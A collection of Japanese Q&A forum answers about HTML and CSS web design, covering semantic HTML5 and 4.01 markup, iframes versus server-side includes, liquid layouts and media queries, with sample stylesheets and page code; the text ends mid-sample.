判らない時は仕様書を読むでしょ。仕様書に書かれていることは聞かない。 --私がこの世界に入ったとき、聞けるのはニュースグループかメーリングリスト・・聞くと「Man!」と帰って来たものです。ソフトのマニュアルを読め!!ということ。 　それは大きな励みになると同時に仕様書を読む癖をつけてもらいました。 仕様書には 12.2 A要素 <!ELEMENT A - - (%inline;)* -(A) -- anchor --> 　と書かれています。http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … 「A要素は要素(Element)であり、インライン要素のみ含むことが出きる。ただし-(A)A要素は除く」 　といの一番に書いてある。HTML5ではブロック要素も入れられますが、【インタラクティブな要素は入れられません】 4.5.1 The a element ・・・【中略】・・・ Content model:Transparent, 【but there must be no interactive content descendant.】 http://www.w3.org/TR/2014/REC-html5-20141028/tex … 　うわべだけを、あちこち探して取り繕うより、きちんと基礎から学ばないと時間の無駄です。膨大な時間の浪費と、誤まった沢道に落ちて這い上がるのが大変です。数学や理科を学ぶのと同じで基礎から正道を歩めば、こんな簡単なものはありません。 　一度 HTML 4.01 仕様書邦訳( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) CSS 2.1仕様（日本語訳）( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　を読んで、どこを調べればよいか程度は頭に入れておくとよいかと ＞div id=”header” でボタンの画像に div class=”back” a href=header として、ページ上部に戻る処理をしているのですが、同じように写真へのリンクにそれを追加しようとした所、やはりマヌケな発想だったようで、 a hrefの重複からうまくいきませんでした。 　divは、あくまで文書構造を補完するためのもので、デザインのためではありません。単純に 　<p><a href="#TOP">ページトップ</a>へ</p> とでもしておいて、 a[href="#TOP]{ display:block; width:80px;height:40px; background-image:url(./images/icon/goBuck.gif); overflow:hidden; text-indent:-20em; } とか、スプライトを使うともっと華々しくできるでしょう。このサイトのように(^^) ＞同じように写真へのリンクにそれを追加しようとした所、やはりマヌケな発想だったようで、 a hrefの重複からうまくいきませんでした。 　<a href="./images/photo/abc.jpg"><img src="" width="" height="" alt=""></a><a href="#TOP">トップへ</a> でよい。
HTMLには文書構造しか書かれていないために、HTML書き直さなくても(擬似)フレームだろうが、スライドショーだろうが、好きなようにデザインできます。メンテナンスも極めて容易で誰でも引き継げます。また、検索エンジン対策はもちろんですが気に入ったページをブックマークしても問題ないし、印刷時にはすべての画像が一覧として印刷されますし・・ ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェックしても大きな原点はないはず・・HTML4.01のidの内容が小文字だと言われる以外は ★スマホのような小さな画面でも、タブレットでも最近の幅広ディスプレイでも ★もちろん印刷するとすべての画像が印刷される。 ★特定の画像を表示させてブックマークしても、ちゃんとその状態で次回も見れる。 ★携帯電話用のスタイルは書いてないけど、ちゃんと見れるはず。もちろんスクリーンリーダー ★とにかく楽です。慣れればですけど [HTML5用スタイルシート] <style media="screen"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,p{margin:0;line-height:2em;} p{text-indent:1em;} header,section,footer{width:100%;max-width:900px;position:relative;margin:0 auto;padding:5px;border:1px;} h2,figure{margin:0 200px;} section{min-height:200px;} header{height:200px;z-index:10;} header nav{position:absolute;top:100%;left:0;width:200px;} /* 色分け */ header{background-color:aqua;} section{background-color:silver;} footer{background-color:lime;} aside{background-color:fuchsia;} figure{background-color:white;} /* ここから擬似フレーム */ figure{display:none;position:relative;} figure:target,figure:hover,figure:active{display:block;} figure img{width:auto;max-width:95%;height:auto;border:inset 4px gray;} figure{margin-top:-240px;padding-top:240px;} section aside{position:absolute;width:180px;padding:10px;top:0;right:0;height:100%;} --> </style> <style type="text/css" media="print"> <!-- body{position:relative;width:100%;} nav{display:none;} figure{float:left;display:block;width:35%;position:relative;border:solid gray 1px;text-align:center;} figure img{min-width:20mm;max-width:98%;height:auto;} figure p{text-indent:1em;text-align:left;} aside:before{content:"";white-space:pre;display:block;clear:left;} --> </style> [HTML4.01用スタイルシート] <style media="screen" type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,p{margin:0;line-height:2em;} p{text-indent:1em;} div.header,div.section,div.footer{width:100%;max-width:900px;position:relative;margin:0 auto;padding:5px;border:1px;} h2,div.figure{margin:0 200px;} div.section{min-height:200px;} div.header{height:200px;z-index:10;} div.nav{position:absolute;top:100%;left:0;width:200px;} /* 色分け */ div.header{background-color:aqua;} div.section{background-color:silver;} div.footer{background-color:lime;} div.aside{background-color:fuchsia;} div.figure{background-color:white;} /* ここからフレーム */ div.figure{display:none;} div.figure:target,div.figure:hover,div.figure:active{display:block;} div.figure img{width:auto;max-width:95%;height:auto;border:inset 4px gray;} div.figure{margin-top:-240px;padding-top:240px;} div.section div.aside{position:absolute;width:180px;padding:10px;top:0;right:0;height:100%;} --> </style> <style media="print" type="text/css"> <!-- body{position:relative;width:100%;} div.nav{display:none;} div.figure{float:left;display:block;width:35%;position:relative;border:solid gray 1px;text-align:center;} div.figure img{min-width:20mm;max-width:98%;height:auto;} div.figure p{text-indent:1em;text-align:left;} div.aside:before{content:"";white-space:pre;display:block;clear:left;} --> </style>
＞何枚かは正常にアップロードできたのですが、アップロードできないものがあります。 　HTMLは経由しないで!! 　直接その画像のURLを指定して見ましょう。 　FFTPだと、アップロードされたときはリモート側のホルダーにファイルが表示されるはずです。 ＞htmlの記述も特に間違っていませんし、ファイルに使うべきではない文字も使っていません。 　もし、FFTPでアップロードが出来ていれば、パス指定が間違っている。 　アップロードの成功・失敗とブラウザでの表示は、まったく別の問題です。切り分けないと原因はわかりません。
それぞれのページの内容や数によってどの方法が良いかが決定します。 　多くの場合、最も良いシンプルな方法は、そもそも別ページにしてデザインを統一する事です。これは、検索エンジンに認識されることや検索エンジンの作成したデータにリンクしたときにサブページが表示されないなど・・。またブックマークにも正しく登録されます。もちろん作成も楽になります。もちろんHTMLの 　企業サイトでは、絶対にiframeを使わないのは上記の理由によるものです。それでは各ページに同じ内容を書くことになりますが、それはSSI（Server Side Includes)というとても古くからある技術かPHPなどのincludeを使用します。 　新しい技術ではなく、古くからある枯れた技術を使うほうが良いとお思います。
すでに自己解決（結論を得られている）されているようですが、iframeはあくまで、そのページにとって重要でないものをinline frameで表示すための物です。 　例えば、ちょっと引用したい--本文とは直接関係ない--'aside的な記事を載せるとか・・。その内容自体を現にそのページを閲覧している場合に主ではあってはならないのです。 　具体的な例を挙げると、新聞社のような膨大なコンテンツがある場合、目次だけ底において、記事本文をiframeで読ませたとします。読者がこの記事はブックマークしようとしても不可能です。もちろん検索エンジンに登録されませんし、たとえ登録しても個々のiframe内の記事だけですから、検索で見つけても親ページは見ることが不可能になります。 　これがframeやiframeが（HTML4.01strict）破棄された最大の理由で、それは、 HTM5でiframeが復活しても変わりません。 　ざっと拝見する限りそもそもiframeを使用すべきではない場面ではないかと思います。 　また、想像できるように技術的にも不可能です。--javascriptを使用したとしてもjavascriptを解釈しない検索エンジンやブラウザには無効です。 　それよりは、HTMK誕生当初HTMK2あたりからあるSSIなどの手段を使用すべきではないかと・・。
margin:0 autoはブロックだけ中心に寄せてくれる。 古いIEの互換モードの場合は、ol#Historyに対してtext-alignにして、li要素の幅を決めるとli要素は中心に来る。その後li内でtext-align:center; 　でも、いまや必要ないでしょう。ちゃんとウェブ標準で作成するほうが良いです。 [HTML5版]HTML4.01に比較するとわかりやすくなりますね。 <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="IRUKA"> <!--[if IE]> <script src="http://html5shiv.googlecode.com/svn/trunk/html5. … <script src="http://css3-mediaqueries-js.googlecode.com/svn/t … <![endif]--> ＿<link rel="stylesheet" href="css/style.css"> ＿<style media="screen"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} body>header,body>section,body>footer{ ＿width:90%;min-width:630px;max-width:900px; ＿margin:0 auto; ＿padding:5px; ＿position:relative; } body>section{ ＿min-height:400px; } ol#History{ ＿overflow-y:scroll; ＿width:300px;height:100px; ＿border:solid 1px #818181; ＿margin:5px auto; ＿list-style-type:none; } section>h2,body>section>section{ ＿margin:0 210px; } section>nav,section>aside{ ＿position:absolute;top:0; ＿width:200px; ＿height:100%; } section>nav{left:0;} section>aside{right:0} /* 判りやすいよう色分け */ body{background-color:gray;} header,footer{background-color:aqua;} section{background-color:silver;} section section{background-color:white;} section nav{background-color:lime;} section aside{background-color:yellow;} --> ＿</style> </head> <body> ＿<header> ＿＿<h1>タイトル</h1> ＿＿<p>このページのheader</p> ＿</header> ＿<section> ＿＿<h2>見出し</h2> ＿＿<ol id="History"> ＿＿＿<li>2015/8/02 - 更新</li> ＿＿＿<li>2015/7/28 - 更新</li> ＿＿＿<li>2015/7/20 - 更新</li> ＿＿＿<li>2015/7/12 - 更新</li> ＿＿＿<li>2015/7/10 - 更新</li> ＿＿</ol> ＿＿<section> ＿＿＿<h3>項記事</h3> ＿＿＿<p> ＿＿＿＿section(本文)はHTML5で導入される要素、sectionの階層で本文文書のツリー構造を示す。 ＿＿＿</p> ＿＿</section> ＿＿<nav> ＿＿＿<h3>ナビゲーション</h3> ＿＿＿<p> ＿＿＿＿ナビゲーションはnav ＿＿＿</p> ＿＿＿<ul> ＿＿＿＿<li>最初</li> ＿＿＿＿<li>次</li> ＿＿＿</ul> ＿＿</nav> ＿＿<aside> ＿＿＿<h3>補足</h3> ＿＿＿<p> ＿＿＿＿本文とは直接関係ない記事はaside ＿＿＿</p> ＿＿</aside> ＿</section> ＿<footer> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</footer> </body> </html>
これとか。 http://tenderfeel.xsrv.jp/jquery/292/ 必要なのは「jquery.js」と「tooltip_jq.js」。 この２つのJSファイルは上記サイトから借りれば良いと思います。 サンプルページ作ってみました。 http://www13.plala.or.jp/torayoshi/sample/index. …
で、それを視聴するのに毎日6時間かかるわけですが、ソーシャルコミュニケーションネットワークとして誰も見ないよ。
別にリンクを示せば、回答できる人はソースぐらい読める。 Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) でチェックするとわかるように、いくつか問題点はあるけど致命的ではない。文法以外にやたらとdiv要素が使われているが、これはHTML5としてはまずい。
html <ul> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> <li><a href="test1.jpg"><img src="test1.jpg"></a></li> </ul> css li{ width: 150px; height: 150px; overflow: hidden; position: relative; transform: rotate(45deg); margin: 40px; float: left; } li img{ position: absolute; width: 250px; height: 250px; transform: rotate(-45deg) translate(0%, -120%); left: 100%; top: 100%; } 親で正方形を４５度傾けたマスクを作り imgで傾いちゃった画像を元に戻し、 rotate(-45deg) 適当な位置に調整しています。 translate(0%, -120%); left: 100%; top: 100%; クリックすれば、リンクに張られたURLが開きます。
ソースかURLを貼りましょう。 手元で再現できないものを直してくれる人は なかなかいないと思います。
そもそもfirefoxでも、1028px幅のブラウザでははみ出る。 いずれにしろ、たったこれだけの物に対してHTMLもCSSも巨大すぎます。しかも、文書構造もぐちゃぐちゃで手がつけられない。 　著者であるあなたですら原因がわからないののですから、その膨大すぎるHTML/CSSを他人が見て判るレベルを超えています。私も見たことないレベルの酷さ・・・。ちゃんと作成すれば、1/100以下--ざっと見たところ1/300にはなるかと---で済みますね。 せっかくHTML5らしいのですが、そもそも <div class="clearfix"></div> こななのがあちこちありますが、HTML5では決してありえませんね。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで [4.4 Grouping content — HTML5]( http://www.w3.org/TR/html5/grouping-content.html … )より 【注意】NOTEと書かれているのは最大レベルの注意事項です。 「著者は、他に適切な要素がないときの最後の最後の手段として、div要素を用いることが推奨される。div要素の代わりにより適切な要素を使用することは、読者にとってはより良いアクセシビリティに、作者にとっては容易なメンテナンス性につながります。」 <div class="clearfix"></div> 　中身がないのにこれは書いてはなりません。まったく必要ないですね。 例えば、 <section id="home" class="clearfix"> <div class="header clearfix"> <div class="container"> <div class="row"> <div class="col-xs-5 col-sm-4"> <a class="logo" href="#home"><img src="images/logo.png" alt="logo"></a> </div><!--/.col-md-4--> <div class="col-md-8"> <!--NAVIGATION START--> <ul class="navigation nav-collapse"> 先頭の10行は、 <article> 　<header> 　　<h1><a class="logo" href="#home"><img src="images/logo.png" alt="logo"></a></h1> 　　<nav> 　　　<ul> ですみますね。それ以外はすべて無駄な記述と言う事です。 ・現在は幅広ディスプレイからスマホや携帯電話のように様々な端末があります。 　HTMLを使用してウェブページを作る最大の目的は、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで [Introduction to HTML 4 (ja)]( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )より 　なのですよ。 ページは固定幅ではなくリキッドで製作しましょう。 1) HTMLは文書構造だけをマークアップします。(余計なものは書かない) 　Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 2) その文書構造を元にスタイルシートを書きましょう。 　スタイルシートは、その[数百分の一]ですむはずです。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ★原因を特定して修正するのは不可能です。 　ゼロから作り直しましょう。 ・率直にテキストエディタで文書構造だけをマークアップする。 　とにかく無意味なclass名が氾濫しています。 　--HTML5は、オーサリングツールを使うのは薦められません。 　というか無理、内容を理解している人間でないとマークアップ不可能 ・その文書構造を元にスタイルを指定する。 　きちんとセレクタを書いていきましょう。
ラジオボタン=1の時、a.htmを送信。 ラジオボタン=2の時、b.htmを送信。 それじゃ・・・ <form action="hoge.cgi" method="post" enctype="multipart/form-data"> 　<ul> 　　<li>a.html<input type="radio" name="file" value="./a.html"></li> 　　<li>b.html<input type="radio" name="file" value="./b.html"></li> 　</ul> 　<input type="submit" value="送信"> </form> 　これではダメかもしれない。 　だとすると、fileで <input type="file" name="upLoadFile""> 　にしなければならないでしょう。 　そもそも、利用者のパソコン内のディレクトリやファイル構成がわからないので、input type="radio"は使えないのじゃないかと・・ 　ここまで書いて気がついたけど これってひょっとして・・・ ★htmlで、フォームの提出先を選択したい。 ★ラジオボタン=1の時、a.htmに対して送信。 ★ラジオボタン=2の時、b.htmに対して送信。 　と言う質問ですか？？
サイトの解析をするのにDreamWeaverはないでしょう。(^^) Web製作なら<a href="https://addons.mozilla.org/ja/firefox/extensions … 開発</a>ツールの豊富なfirefoxをお使いだと思いますが、その中のFirebugや Web Developer( https://addons.mozilla.org/ja/firefox/addon/web- … )、その他のjavascript解析ツールを使えば良いです。 　保存するときは、firefoxでローカルに保存・完全なり、アドオンのScrapBookを使うと、リンクを辿って指定された必要なファイルを保存してくれます。 ＞これは意図的にサイトの制作者がソースを見せないようにしているのでしょうか。 　それはないです。だってブラウザがそれを見れないと動作できない。ブラウザが読取れるという事は隠し立てなんてされていない。(^^)
いわゆる「サイトリンク」ですが、これ自体はgoogleのアルゴリズムが自動作成するものですから、ユーザーの立場からその出没をコントロールできません。 　そのサイトの利用が多く、かつ有益なサイトと判断した場合にのみ作成されます。 　サイトリンクが出てくると、無用なリンクを除いたりは出来ます。 　また、ページの詳細ですが、ページの内容が文書のヘッダ、HTML5だと<header></header>内、それより前のHTMLだと<dic class="header"></div>内にあるページの説明などが自動的に読取られます。 　HTML5では文書構造を示す要素がありますが、それ以前のHTMKでは、 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』でしたね。 　HTMLがきちんとマークアップされて、文書構造が検索エンジンにより買いできないと、要約を期待通りには掲載してくれません。 　私はHTML5だと <body> 　<header> 　　<h1>見出し</h1><!-- titleと同じもの --> 　　<div class="abstract"><!-- またはsummary --> 　　　<p><strong>・・・などの商品を扱っています。</strong></p> 　　</div> 　　<nav> 　　　<ul> 　　　　<li><a href=""></a></li> 　　　　・・・・ 　　　</ul> 　　</nav> 　</header> のように、HTML4.01などは <body> 　<div class="header"> 　　<h1>見出し</h1><!-- titleと同じもの --> 　　<div class="abstract"> 　　　<p><strong>・・・などの商品を扱っています。</strong></p> 　　</div> 　　<div class="nav"> 　　　<ul> 　　　　<li><a href=""></a></li> 　　　　・・・・ 　　　</ul> 　　</div> 　</div> などのようにマークアップしています。これがそのまま掲載されてきました。 　検索エンジンは単純作業を行なうロボットに過ぎませんから、彼に理解できるようHTML書かないとだめです。 　一度、HTML4.01やHTML5の仕様書や、ウェブマスター向けガイドライン - Search Console ヘルプ( https://support.google.com/webmasters/answer/357 … )をしっかり読まれることをお勧めします。
No.2です。 どちらのファイルもA フォルダー直下にあるのなら　./mail.php で大丈夫です。 因みに　../mail.phpでリンクしたなら　aファイルがaフォルダに bファイルが直下にって事だと思います。またbファイルが bフォルダ内に有れば　../b/mail.phpです。
iframeを使う限り避けられません。呼び出すファイルを他のサーバーに置くとかですかね。 　iframeは、その問題が避けられませんから、単純に各ページにheader,nav,hooterを共通化したファイルを作って、overflow:autoでデザインするほうが良いでしょう。 　通常のレンタルサーバーでしたら、include(SSIなりPHP)が使えますので楽です。FC2は使えません。 　HP(ヒューレッドパッカード社)ではなく、ウェブページとしてお答えしました。 [ホームページ - Wikipedia( https://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC … )]
同じかどうかわかりませんが、 環境設定　→　ブログの設定　→　記事の設定　→　最新記事一覧 最新記事一覧で表示件数を変更できるようです。
VBScriptで、 Dim XMLHTTP Set XMLHTTP = CreateObject("MSXML2.XMLHTTP") XMLHTTP.Open "HEAD", "http://example.com/path/foo.pdf", False XMLHTTP.Send If XMLHTTP.Status = 200 Then WScript.Echo XMLHTTP.getResponseHeader("Last-Modified") Else WScript.Echo "ERROR CODE=" & XMLHTTP.Status End If で、更新タイムスタンプが取れます。
その逆です。 TEXTはコードで、HTMLはバナーです。 詳しくはこちら。 http://blog.goo.ne.jp/how_to/e/914a5e6e5346f4e5e … どちらもテキストや画像の自由配置には非対応。 自由配置にはCSSやHTMLの知識が必要です。
恐らくですが、読み込み先のURLはここでしょうか。URLSnooper2による解析です。 http://cont.lanove.kodansha.co.jp/10004.html
FirefoxやChromeのデバッガからなら処理後の状態を保持した ソースとして編集したりコピーしたりできます
torayoshiです。 No.6さんが書かれてるように、他の要素が邪魔してるのなら私らには検証不可です。 質問分通りのタグに限っての話では、こちらではちゃんとリンクは機能してるので、 後はそちらの環境に依存。ということになりますが。
遅くなって申し訳ない。とても忙しくて ＞ただ、2、3、4はいずれも既存コンテンツのレイアウトの制約があり ＞幅が固定です。上記の3つが常にセンター揃えになっている状態を ＞考えています。 　既存コンテンツと言う事は、バナーなどの画像があるのですか？ 　だとしたら画像も一緒に伸縮させるのですが・・・ 　aside img{max-width:100%;height:auto;} とか ＞大きなウインドウを小さくしていくと左右の余白が小さくなっていき、 ＞幅が2+3+4を下回ると右のレイアウトで固定になるのが理想です。 　基本的な事は、前回に説明しました。 ＞なお、スマホの画面いっぱいに拡大表示を行うため ><meta name="viewport" content="width=850"> >と指定を行うが前提です。 　viwportは、 <meta name="viewport" content="width=device-width; initial-scale=0.8" > とか、850pxでは文字が小さくなりすぎませんか??? 　先にも回答しましたが、mediaqueryを使用するときは、その前提として「リキッドでデザインされていること」が重要なのです。そもそもmediaqueryは、media別スタイルシートの拡張なのです。 　アフェリエイトやバナーなどは、伸縮させればよい。 ★画像は適当な物を用意する。 ★下記でサイズが%表示されている物を固定にすると一応固定にはなりますが・・ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta name="viewport" content="width=device-width, initial-scale=0.8"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> <style media="screen" type="text/css"> <!-- h1,h2,h3,p{margin:0;line-height:1.6em;} html,body{margin:0;padding:0;} p.bunner{margin:0;} p.bunner img{max-width:100%;height:auto;} div.header,div.section,div.footer{width:100%;max-width:1000px;min-width:640px;margin:0 auto;} div.section{position:relative;} div.section h2,div.section p,div.section div.section{margin:0 200px;} div.section div.section{width:auto;min-width:0;min-height:100px;} div.section * p{margin:0;} div.section div.nav,div.section div.aside{position:absolute;width:190px;top:0;height:100%} div.section div.nav{left:0;} div.section div.aside{right:0;} /* 判りやすいように色付け */ body{background-color:gray;} div.header{background-color:silver;} div.section{background-color:white;} div.section div.section{background-color:rgb(255,255,200);} div.section div.nav{background-color:rgb(160,255,255);} div.section div.aside{background-color:rgb(255,160,160);} div.footer{background-color:rgb(200,200,200);} @media screen and (max-width: 640px){ div.header,div.section,div.footer{width:auto;min-width:240px;} div.section{position:relative;min-height:400px;} div.section h2,div.section p,div.section div.section{margin:0 0 0 200px;} div.section div.section p{margin:0;} div.section div.nav,div.section div.aside{float:left;width:190px;height:50%;} div.section div.nav{top:0;} div.section div.aside{top:50%;left:0;} } --> </style> </head> <body> ＿<div class="header"> ＿＿<h1 id="title">Your title</h1> ＿</div> ＿<div class="section"> ＿＿<h2>A smaller heading</h2> ＿＿<p>本文記事</p> ＿＿<div class="section"> ＿＿＿<h3>A more smaller heading</h3> ＿＿＿<p>本文記事</p> ＿＿</div> ＿＿<div class="section"> ＿＿＿<h3>A more smaller heading</h3> ＿＿＿<p>本文記事</p> ＿＿</div> ＿＿<div class="nav"> ＿＿＿<ul> ＿＿＿＿<li><a href="#">Some</a></li> ＿＿＿＿<li><a href="#">navigation</a></li> ＿＿＿＿<li><a href="#">links</a></li> ＿＿＿</ul> ＿＿</div> ＿＿<div class="aside"> ＿＿＿<h3>Something aside</h3> ＿＿＿<p class="bunner"> ＿＿＿＿<img src="[画像URL]" width="240" height="80" alt=""> ＿＿＿</p> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h3>A nice footer</h3> ＿</div> </body> </html>
誤: var div_el 正: var div_ele たぶん間違い parent_object.removeChild(element.childNodes.item(0)); オススメの記法 while (parent_object.firstChild) parent_object.removeChild(parent_object.firstChild); どうせなら分かりやすく記述 var textAreaText = document.forms['fm'].elements['contents'].value;
画像 img 要素は行内要素ですから、そのままで横に並ぶはずです。 ★表は決して使ってはなりません。 <p> 　<a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" /></a> 　<a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" /></a> </p> 　必ずブロック要素内ですけど・・ >上の二枚の画像を横に並べるには、 　この質問が、画像間に半角スペースが現れることを避けたいのでしたら、 <p> 　<a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" /></a><a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" /></a> </p> とする。 　仕様書で言うと、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLでは、次に挙げる文字だけが空白類文字であると定義される。 ・ASCIIスペース (&#x0020;) ・水平タブ (&#x0009;) ・書式送り (&#x000C;) ・ゼロ幅スペース (&#x200B;) 　行区切り類もまた、空白類文字である。 ・・・【中略】・・・ 　本仕様は、ここに空白類文字と明示的に定めたもの以外のスペース文字類については、レンダリングその他の挙動を示すことはない。 ・・・【中略】・・・ 　ここで、ソース文書中で語間に空白類が複数連なっている場合、PRE要素を除いて、レンダリング結果の語間スペース調整は全く異なるものになるという点に注意されたい。 特にユーザエージェントは、語間スペースの出力処理に際しては、連続する空白類の入力があった場合は1つにまとめてしまう必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Paragraphs, Lines, and Phrases (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　そのままでは、改行が半角スペースとして処理されますので <p style="font-size:0px;white-space:nowrap;"> 　<a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" style="font-size:14px"></a> 　<a href="ttp://.jpg/" target="_blank"><img src="ttp://.jpg" alt=".jpg" border="0" width="240" height="180" style="font-size:14px"></a> </p> whitespaceは半角スペース・タブ・改行の表示の仕方を指定する。 　nowrapだと、狭くても改行されない。改行やタブはひとつにまとめられる。 font-sizeでその空白のサイズを指定 　画像が読み取れないときの大体テキスト(alt)を評しする必要があるときのサイズも指定しておく。
相対パスにおいてimages/footer-bg.pngと../images/footer-bg.pngは違うからでは？
>imgを埋め込んでリンクの貼り付けを行うには、いずれにしても自分自身でタグの編集作業を行う必要があるという事ですね？ 「はい」そうなります。 ただし、閲覧しているページの入力欄がタグの使用を可能にしていることが前提になります。
class,idなどを利用するのは本来の目的から言うと誤りです。 DIVに限らず、「id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」が基本で、プレゼンテーションのためにidやclassをつけるのは避けましょう。 　先でプレゼンテーション変えるとき、class名も書き換えなければならない!! 　divやspanやidやclassがやたらと増えて煩雑なHTMLになるし、将来プレゼンテーションを変更しようとしたときにHTMLも書き換えなければならなくなります。 　HTML5では 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Grouping content — HTML5( http://www.w3.org/TR/2014/REC-html5-20141028/gro … )］より 【注意】著者は、他により手義綱な要素ないときの最後の手段としてdiv要素を使用することが強く奨励されます。div要素ではなく、より適切な要素を使用する事は、読者のためには「より良いアクセシビリティ」を作者のためには「メンテナンス性の向上」につながります。 <li><A href="http://www...01.html">【１】</A> <A href="http://www...02.html">【２】</A></li> HTML5やXHTMLでは大文字のタグは使いません。 ※【】はHTMLには書きません。検索エンジンも読み上げソフトも、いちいち読んでしまいます。 HTMLだと <nav><!-- HTML側ではナビゲーションリンクとしてマークアップ --> 　<ul><!-- 順不同リスト --> 　　<li><a href="/01.html">最初のページ</a></li> 　　<li><a href="/02.html">次のページ</a></li> 　　<li><a href="/03.html">ゴオグル</a></li> 　　<li><a href="/04.html">ゴオグルログイン画面入り口</a></li> 　　<li><a href="/05.html">テストだよ</a></li> 　</ul> </nav> HTML4.01だと、文書構造を示す要素が用意されていませんので 　　⇒3.1. 新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) <div id="nav"><!-- classでナビゲーションだと知らせる --> 　<ul><!-- 順不同リスト --> 　　<li><a href="/01.html">最初のページ</a></li> 　　<li><a href="/02.html">次のページ</a></li> 　　<li><a href="/03.html">ゴオグル</a></li> 　　<li><a href="/04.html">ゴオグルログイン画面入り口</a></li> 　　<li><a href="/05.html">テストだよ</a></li> 　</ul> </div> 　　★あなたの場合、その内容でしたら 　　　<nav> 　　　　<ul> 　　　　　<li><a href="/01.html">最初のページ</a></li> 　　　　　<li><a href="/02.html">次のページ</a></li> 　　　　　<li><a href="/03.html">ゴオグル</a></li> 　　　　　<li><a href="/04.html">ゴオグルログイン画面入り口</a></li> 　　　　　<li><a href="/05.html">テストだよ</a></li> 　　　　</ul> 　　　</nav> 　　のほうが適切で、はるかに簡単なのですが、それは今回は説明しません。 先のHTML5のHTMLに対して、 nav ul,nav ul li{ list-style:none; margin:0;padding:0; display:inline; } nav ul li a{ display:block; margin:5px 10px; } nav ul li a[href="/03.html"], nav ul li a[href="/04.html"]{ display:inline-block; } nav ul li a:before{ content:"【"; } nav ul li a:after{ content:"】"; } だけでよいですね。これだと煩雑なclassつける必要もないし、リスト項目が増減してもよいし、後で好きにデザイン返られる。だってHTMLには文書構造しか書かれてないから。 HTML/CSSで最も重要なこと!! 　→構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 【サンプル】 ※タブは＿に置換してあるので戻す。 ※Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATA入力(右上)で検証済み <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="ORUKA1951"> <style media="screen"> <!-- nav ul,nav ul li{ list-style:none; margin:0;padding:0; display:inline; } nav ul li a{ display:block; margin:5px 10px; } nav ul li a[href="/03.html"], nav ul li a[href="/04.html"]{ display:inline-block; } nav ul li a:before{ content:"【"; } nav ul li a:after{ content:"】"; } --> </style> </head> <body> ＿<header> ＿＿<h1 id="title">Your title</h1> ＿＿<nav><!-- HTML側ではナビゲーションリンクとしてマークアップ --> ＿＿＿<ul><!-- 順不同リスト --> ＿＿＿＿<li><a 